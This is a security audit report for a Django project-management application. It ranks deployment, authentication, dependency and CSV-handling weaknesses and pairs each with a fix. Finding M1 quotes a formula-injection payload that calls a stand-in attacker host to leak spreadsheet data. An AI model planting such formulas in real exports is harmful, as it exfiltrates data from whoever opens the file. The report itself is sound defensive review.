# Security Audit — i-connects

**Scope:** Full application codebase (Django 5.2 monolith: `accounts`, `projects`,
`tasks`, `roles`, `comments`, `notifications`, `notes`, `forms_builder`,
`contributions`, `audit`, `mailing_list`, `integrations`), deployment config
(Dockerfile, docker-compose, Caddyfile), CI, and third-party dependencies.
**Date:** 2026-07-08
**Reviewed against:** live/production deployment readiness.

**Overall assessment:** the application layer is well-built for a Django MVP —
consistent authorization mixins, no raw SQL, no `eval`/`pickle`/unsafe
deserialization, markdown/comments are escape-then-render, and outbound
webhooks are allowlisted against SSRF. The real risk concentration is in
**deployment/infrastructure configuration**, where a single missing
environment variable or missing `.dockerignore` could turn a "hardened"
production config into a wide-open one. Findings are ranked so the team can
fix Critical/High items before the first live deploy.

---

## Critical

### C1. No `.dockerignore` — secrets can be baked into the image
**Where:** `Dockerfile:39` (`COPY . .`), repo root (no `.dockerignore` file).

The Dockerfile copies the entire build context into the image. If `.env`
(which holds `DJANGO_SECRET_KEY`, `POSTGRES_PASSWORD`, SMTP/Resend/AWS
credentials) is present in the project root at build time — the normal
local/CI layout described in `README.md`/`DEMO_DEPLOYMENT.md` — it is baked
into an image layer verbatim. Anyone who can pull or inspect that image
(registry access, a compromised CI runner, `docker save`) can extract the
secrets even if a later layer deletes the file.

**Fix:** add a `.dockerignore`:
```
.env
.env.*
.git
node_modules
__pycache__
*.pyc
media/
staticfiles/
```

### C2. Missing `DJANGO_SETTINGS_MODULE` silently serves `dev` settings (DEBUG=True, ALLOWED_HOSTS=["*"], hardcoded SECRET_KEY) in production
**Where:** `manage.py:9`, `config/wsgi.py`, `config/asgi.py`, `config/celery.py`,
`Dockerfile:25` (`ENV DJANGO_SETTINGS_MODULE=config.settings.dev`), and
`config/settings/dev.py:5-11`:

```python
DEBUG = True
ALLOWED_HOSTS = ["*"]
SECRET_KEY = "dev-insecure-change-me"  # noqa: S105
```

Production correctness depends entirely on the `.env` file used at deploy
time setting `DJANGO_SETTINGS_MODULE=config.settings.prod`
(`docker-compose.prod.yml` comment says so, but nothing enforces it). If that
variable is ever absent — a typo, a missed `.env` copy, someone running
`docker run` directly instead of via compose, a orchestration
migration to Kubernetes/ECS that drops the env var — the container falls
back to `dev`: full Django debug tracebacks (source code, local variables,
SQL, environment) are served to the public internet, `ALLOWED_HOSTS = ["*"]`
disables Host-header validation, and the app runs on a hardcoded, publicly
known `SECRET_KEY` (breaks session/CSRF token integrity and password-reset
token signing for every deployment that hits this fallback).

**Fix:** make the fallback fail loudly instead of silently downgrading
security posture. Options (pick one, don't need all):
- Change the Dockerfile default to `config.settings.prod` and make `dev.py`
  the thing you must opt into locally via `.env`, not the image default.
- Or remove the default entirely (`os.environ["DJANGO_SETTINGS_MODULE"]`,
  no `.setdefault`) so the process crashes immediately if unset, rather than
  degrading to an insecure mode.
- Add a startup assertion in `prod.py` that refuses to boot if
  `DEBUG` or `ALLOWED_HOSTS == ["*"]` ever resolve true under it.

---

## High

### H1. Optional email verification enables account/invitation hijacking
**Where:** `config/settings/base.py:177` (`ACCOUNT_EMAIL_VERIFICATION = "optional"`),
`apps/accounts/forms.py:73-77` (`SignupForm.clean_email` only rejects
duplicates, not unverified claims), `apps/projects/views.py:1084-1088`
(`AcceptOrDeclineInviteView.post` authorizes purely via
`request.user.email == invitation.email`).

Anyone can sign up with an email address they don't own — e.g. a colleague's
institutional address — without ever proving receipt. If a PI later invites
that email to a project, the attacker's already-registered account satisfies
the string match and joins as the impersonated user, receiving that user's
notifications, invitations, and mailing-list membership, and permanently
squatting the email (unique constraint) so the real owner can never sign up.

**Fix:** set `ACCOUNT_EMAIL_VERIFICATION = "mandatory"` (block login/invite
acceptance until the email is confirmed), or at minimum gate invitation
acceptance and password-reset trust behind `email_verified`.

### H2. Container runs as root
**Where:** `Dockerfile` — no `USER` directive; gunicorn (`Dockerfile:46`) runs
as root inside the container.

A remote-code-execution bug in the app or in any dependency (see dependency
section) grants root inside the container, which meaningfully eases
container-escape and lateral-movement attempts compared to an unprivileged
user.

**Fix:** add a non-root user in the final image stage:
```dockerfile
RUN useradd -m -u 1000 appuser
USER appuser
```
(ensure `STATIC_ROOT`/`MEDIA_ROOT` and any writable paths are owned by that
user, or created before the `USER` switch).

### H3. Django pinned to `5.2.0` initial release — likely missing security patches
**Where:** `requirements.txt` (`Django==5.2`).

Django ships regular `5.2.x` security point releases. Pinning the exact
`.0` tag means the deployment ships without any patches released since
initial LTS cut — including, most likely, fixes classed as security
advisories on the Django security page. (Exact CVE IDs not independently
confirmed here — treat as "very likely outdated," not a specific verified
CVE.)

**Fix:** bump to the latest `5.2.x` patch before launch, and set up
Dependabot/renovate to track Django security releases specifically (the
existing `.github/dependabot.yml` already covers `pip` weekly, so this is
mostly about not ignoring those PRs).

### H4. `psycopg[binary]` and Node 20 base image stale/EOL
**Where:** `requirements.txt` (`psycopg[binary]==3.2.3`), `Dockerfile:3`
(`FROM node:20-bookworm-slim`).

`psycopg[binary]` statically bundles libpq/OpenSSL; staying on an old binary
wheel means missing upstream libpq/OpenSSL security fixes even with no
psycopg code changes. Separately, Node.js 20 ("Iron") LTS reached end-of-life
in April 2026 — as of the current date it receives no further security
patches upstream. Node here is build-stage only (Tailwind compile), so the
blast radius is limited to the build pipeline, not runtime, but it's still a
supply-chain gap worth closing.

**Fix:** bump `psycopg[binary]` to latest `3.2.x`; move the CSS builder stage
to `node:22-bookworm-slim` or newer LTS.

---

## Medium

### M1. CSV export is vulnerable to formula/CSV injection
**Where:** `apps/contributions/views.py` (`_serialize_row`, `_csv_response`),
columns `project`, `user_name`, `task` are written into CSV cells with no
sanitization.

A project member who sets their display name or a task name to a value
starting with `=`, `+`, `-`, or `@` (e.g.
`=HYPERLINK("http://evil.example/?leak="&A1,"click")`) gets that formula
executed when a project manager opens the exported CSV in Excel/Google
Sheets/LibreOffice — classic CSV/formula injection, usable for data
exfiltration or (older Excel/DDE) code execution against whoever opens the
export.

**Fix:** in `_serialize_row`, prefix any cell value whose first character is
in `=+-@\t\r` with a single quote (`'`) before writing, or strip that
leading character. Apply to every user-controlled column, not just names.

### M2. No IP-based throttling on the login endpoint itself
**Where:** `apps/accounts/lockout.py` (10 failed attempts / 15-minute window,
per email), `apps/accounts/throttle.py:7-9` (explicitly scoped to signup and
password-reset only, not login).

An attacker can submit 9 password guesses every 15 minutes against one known
account indefinitely without ever tripping the lockout — a slow, sustained
credential-stuffing/brute-force path. The 10-character minimum password
length is the only real bulwark. This is a real gap for a live product with
externally-known usernames (email addresses).

**Fix:** extend the same per-IP throttle already built for
signup/password-reset (`apps/accounts/throttle.py`) to the login view.

### M3. `seed_demo` management command has no environment guard
**Where:** `apps/core/management/commands/seed_demo.py:35,72`, password
`demopass` also printed in `FOR_JIM.md:29`.

The command creates real accounts with a fixed, now-documented password and
has no check preventing it from being run against a production
settings/database — only a docstring warning. If ever run against prod (bad
copy-paste of a demo-setup runbook, CI job misconfiguration), it creates
publicly-known-password accounts in the live system.

**Fix:** add a hard guard, e.g. `if not settings.DEBUG: raise
CommandError("seed_demo is dev/demo-only")`, or gate on a dedicated
`ALLOW_DEMO_SEED` env var that is never set in prod.

### M4. Redis has no authentication in either compose file; dev compose exposes DB/Redis publicly by default
**Where:** `docker-compose.yml:15-16` (`db` ports `5432:5432`),
`docker-compose.yml:25-26` (`redis` ports `6379:6379`), no `requirepass`/ACL
configured for the `redis:7` image in either compose file, weak default
`POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-iconnects}`.

`docker-compose.prod.yml` correctly zeroes out `ports: []` for `db`/`redis`,
so a *correct* `docker compose -f docker-compose.yml -f
docker-compose.prod.yml up` deployment is not directly exposed. But this
depends on always remembering to layer the override file, and even
internally-scoped, Redis has zero authentication — any compromised container
(web or celery) has full unauthenticated read/write access to the broker and
Celery result backend.

**Fix:** set a Redis password (`requirepass` + matching `REDIS_URL`/
`CELERY_BROKER_URL` with credentials) regardless of network exposure; add a
guard rail (e.g. a `make prod-up` wrapper, or a single combined
`docker-compose.prod.yml` that isn't an optional overlay) so the "ports
closed" behavior isn't dependent on remembering two `-f` flags.

### M5. `.gitignore` doesn't cover realistic prod env filenames
**Where:** `.gitignore:26-28` — only `.env`, `.env.local`, `.env.*.local`.

A file named `.env.prod` or `.env.demo` — a natural name given
`docker-compose.prod.yml` and `DEMO_DEPLOYMENT.md` already exist — is **not**
excluded and could be committed by accident, along with production secrets.

**Fix:** broaden to `.env*` and explicitly re-allow `.env.example` if needed:
```
.env*
!.env.example
```

### M6. Caddy edge adds no defense-in-depth beyond TLS termination
**Where:** `Caddyfile` (reverse-proxies to `web:8000` only).

All hardening (HSTS, nosniff, X-Frame-Options) relies entirely on Django's
`SecurityMiddleware` in `prod.py`. There's no rate limiting, no IP
allowlisting, and no extra protection in front of `/admin/` (Django's
built-in admin, publicly routable per `config/urls.py:12`) or the custom
`/admin/console/` staff surface — both are internet-reachable and rely
solely on Django auth to keep attackers out.

**Fix:** for a live deployment, consider adding Caddy-level rate limiting
(or a WAF/Cloudflare in front), and/or IP-restricting `/admin/` if the admin
users are on a known network. Not blocking for launch, but worth doing before
the admin surface sees real traffic.

### M7. django-allauth version not confirmed current
**Where:** `requirements.txt` (`django-allauth[socialaccount]==65.3.0`).

allauth has had account-security advisories in past major versions; whether
one affects 65.3.0 specifically was not confirmed in this review (flagging
as "verify before launch" rather than a confirmed CVE) given its central
role in auth/social-login.

**Fix:** check the allauth changelog/security advisories for anything past
65.3.0 and upgrade if a fix applies.

---

## Low

### L1. Unverified self-reported ORCID iD enables identity misattribution
**Where:** `apps/accounts/forms.py:289` (`ProfileForm` lets any user freely
type an `orcid` value), `apps/accounts/adapters.py:56-58` (treats `orcid` as
authoritative for social-login population).

A user can set their public profile's ORCID iD to a real researcher's iD
with no proof of ownership (the `unique=True` constraint only stops two
*local* accounts from colliding, not impersonation of someone who hasn't
signed up). Could be used to misattribute contributions or borrow academic
credibility on a public profile page.

**Fix:** make the `orcid` field read-only except via the verified allauth
ORCID OAuth linking flow; don't allow free-text self-entry once an account
exists.

### L2. Legacy `Token`/`Session` compat tables browsable by any staff user
**Where:** `apps/accounts/admin.py:42-53`.

Values are hashed (`hashed_token`, `hashed_session_token`) so this isn't a
raw-secret leak, but any `is_staff` user (not just superusers) with default
`ModelAdmin` permissions can browse `sent_to`/`type`/`expires_at` and
correlate active password-reset/verification flows to specific users.

**Fix:** restrict these admin registrations to superuser-only, or remove
from admin entirely since they're legacy Blitz-compat tables.

### L3. Latent unused `|safe` template variable
**Where:** `templates/_components/page_header.html:14` —
`{{ action_html|safe }}`.

No current view passes `action_html`, so it's dead code today, not an active
XSS vector. Flagging so it isn't wired up to user-controlled data later
without review.

**Fix:** remove if truly unused, or add a comment marking it
trusted-content-only if kept for future use.

### L4. CSV import has no size/type cap
**Where:** `apps/tasks/import_form.py`, `apps/tasks/views.py:412-435`
(`TaskImportView.form_valid`).

The uploaded CSV is streamed in-memory and never written to disk, so there's
no path-traversal/execution risk, but there's also no enforced size limit —
a very large upload could cause resource exhaustion. Low impact since it's
behind `LoginRequiredMixin`/project-membership checks.

**Fix:** add a reasonable max-size check in the form's `clean()` before
parsing.

### L5. Container base images not pinned by digest
**Where:** `Dockerfile:3,19` (`node:20-bookworm-slim`, `python:3.12-slim-bookworm`).

Floating tags mean builds aren't reproducible and can silently pick up
upstream changes (good — patches; bad — no controlled rollout/verification
step). Not a vulnerability by itself, but worth pinning by digest with a
deliberate update process once the app is live.

---

## Confirmed clean (no action needed)

- **SQL injection:** no `.raw()`, `cursor.execute`, `.extra()`, or
  string-built SQL anywhere in `apps/` — all queries go through the ORM.
- **Dangerous primitives:** no `pickle`, `eval`, `exec`, `os.system`,
  `subprocess`, or unsafe `yaml.load` anywhere in the codebase.
- **Markdown/XSS:** `apps/notes/utils.py` HTML-escapes input *before*
  markdown rendering, then marks the result safe — raw HTML in notes/markdown
  cannot execute. Verified against `apps/notes/tests.py`.
- **Comments:** plain `TextField`, rendered with default autoescaping, no
  markdown, no `|safe`.
- **`forms_builder`:** dynamic JSON-Schema forms render through real Django
  `Field` objects with default autoescaping; `jsonschema` validation has no
  remote `$ref` fetch configured, so no SSRF-via-schema vector.
- **SSRF:** the one outbound-webhook integration (`apps/integrations/discord.py`)
  validates scheme + hostname against an allowlist correctly (including
  userinfo-trick resistance).
- **Authorization architecture:** consistent `LoginRequiredMixin` +
  `ProjectContextMixin`/`ProjectMemberRequiredMixin`/`ProjectManagerRequiredMixin`
  usage across projects/tasks/roles/comments/notes; no `@csrf_exempt`
  anywhere in the codebase.
- **Password reset:** signed, single-use, password-hash-bound tokens; no
  account-enumeration leak in login or reset-request forms.
- **Secrets in source:** no live credentials found in tracked files — only
  test fixtures (`conftest.py`) and the documented demo password.
- **CI:** `.github/workflows/ci.yml` uses minimal `permissions: contents:
  read`, no `pull_request_target`, no secret echoing; Dependabot is
  configured for pip/npm/github-actions.
- **Celery:** JSON-only serialization (no pickle); `CELERY_TASK_ALWAYS_EAGER`
  confined to test settings.
- **Django settings baseline (when `prod.py` actually loads):**
  `SESSION_COOKIE_SECURE`, `CSRF_COOKIE_SECURE`, HSTS (30 days + subdomains +
  preload), `SECURE_CONTENT_TYPE_NOSNIFF`, `X_FRAME_OPTIONS=DENY`,
  `SECURE_SSL_REDIRECT`, and a fail-closed `SECRET_KEY` (`os.environ[...]`,
  raises if unset) are all correctly configured — see C2 for the risk of
  this file not being the one that loads.

---

## Suggested fix order for launch

1. **C1, C2** — dockerignore + fail-closed settings module (prevents an
   entire class of "silently insecure" deploys).
2. **H1–H4** — email verification, non-root container, Django/psycopg/Node
   bumps.
3. **M1–M7** — CSV injection fix, login IP throttle, demo-seed guard, Redis
   auth, `.gitignore` broadening, Caddy hardening, allauth version check.
4. **L1–L5** — lower-urgency hardening, fold into normal backlog.
